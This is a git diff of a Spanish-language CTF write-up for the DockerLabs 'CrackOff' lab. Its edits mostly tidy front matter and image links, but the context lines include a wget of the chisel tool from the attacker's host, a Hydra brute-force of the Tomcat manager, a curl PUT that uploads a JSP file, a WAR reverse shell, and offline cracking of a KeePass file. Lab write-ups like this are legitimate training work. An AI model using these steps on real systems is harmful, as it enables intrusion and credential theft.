@@ -1,26 +1,21 @@
 ---
-
 title: "DockerLabs - CrackOff Hard (Write-up)"
 platform: "DockerLabs"
 date: 2025-12-19
 tags:
-- Linux 
-- SQLi 
-- Tomcat-Exploitation 
-- Chisel 
-- Port-Forwarding 
-- KeePass-Cracking 
-- Privilege-Escalation 
-- Custom-Script-Exploit
+  - Linux 
+  - SQLi 
+  - Tomcat-Exploitation 
+  - Chisel 
+  - Port-Forwarding 
+  - KeePass-Cracking 
+  - Privilege-Escalation 
+  - Custom-Script-Exploit
 estado: "Completado"
 toc: true
-hide_title_image: true # Añade esta línea
+hide_title_image: true
 image:
-  path: /assets/images/posts/dockerlabs/cracoff/banner.png
- toc: true
-toc_label: Contenido del Reporte
-toc_sticky: true
-
+  path: /assets/images/posts/dockerlabs/cracoff/banner.png
 ---
 
 ##  1. Executive Summary (Resumen Ejecutivo)
@@ -395,7 +390,7 @@ wget http://<IP_KALI>:9001/chisel
 chmod +x chisel
 ```
 
-![[Pasted image 20251215191321.png]]
+![PortForwarding](/assets/images/posts/dockerlabs/cracoff/chisel.png){: .align-center}
 
 
 ---
@@ -425,7 +420,7 @@ cd /tmp
 
 Con el acceso habilitado en `http://localhost:8080`, se confirmó la versión del servicio y se procedió a la validación de acceso al panel de gestión.
 
-![[Pasted image 20251215195633.png|700]]
+![Tomcat version](/assets/images/posts/dockerlabs/cracoff/tomcat1.png){: .align-center}
 
 ### 8.1. Ataque de Fuerza Bruta / Validación
 
@@ -436,7 +431,7 @@ Aunque se contaba con un dump previo de SQLMap, se utilizó **Hydra** para confi
 ```Bash
 hydra -l alice -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-get /manager/html
 ```
-![[Pasted image 20251216201244.png]]
+![Usuario Tomcat](/assets/images/posts/dockerlabs/cracoff/user1.png){: .align-center}
 
 > [!CHECK] **Resultado de Autenticación** El ataque confirmó las credenciales filtradas anteriormente, permitiendo el acceso al **Tomcat Web Application Manager**. Este panel es el vector definitivo para lograr la ejecución remota de código (RCE).
 
@@ -499,7 +494,7 @@ curl -X PUT http://127.0.0.1:8080/pwn.jsp/ --data '<% out.println("pwned"); %>'
 
 Tras recibir la conexión reversa del archivo `shell.war`, se obtuvo una shell limitada. Para poder utilizar comandos interactivos (como `su`, `nano`, o el autocompletado con Tab), se procedió al tratamiento de la TTY.
 
-![[Pasted image 20251216204702.png]]
+![chisel1](/assets/images/posts/dockerlabs/cracoff/burp.png){: .align-center}
 
 ### Tratamiento TTY y acceso al sistema
 
@@ -577,7 +572,7 @@ cat user.txt
 
 **User Flag:** `d099be3ff7be7294c9344daadebca767`
 
-![[Pasted image 20251218174908.png]]
+![Acceso a Mario](/assets/images/posts/dockerlabs/cracoff/ls.png){: .align-center}
 
 #### Exfiltración de Base de Datos (KeePass)
 
@@ -587,7 +582,7 @@ Se identificó un archivo de base de datos de contraseñas de **KeePass** perten
 
 Se realizó la transferencia del archivo `.kdbx` a la máquina atacante para su posterior análisis _offline_ (Fuerza bruta con `keepass2john` y `john the ripper`).
 
-![[Pasted image 20251218175121.png|600]]
+![KeePass](/assets/images/posts/dockerlabs/cracoff/keepass.png){: .align-center}
 
 ### Acceso al usuario Alice. 
 Se obtuvo acceso mediante SSH utilizando credenciales previamente identificadas.
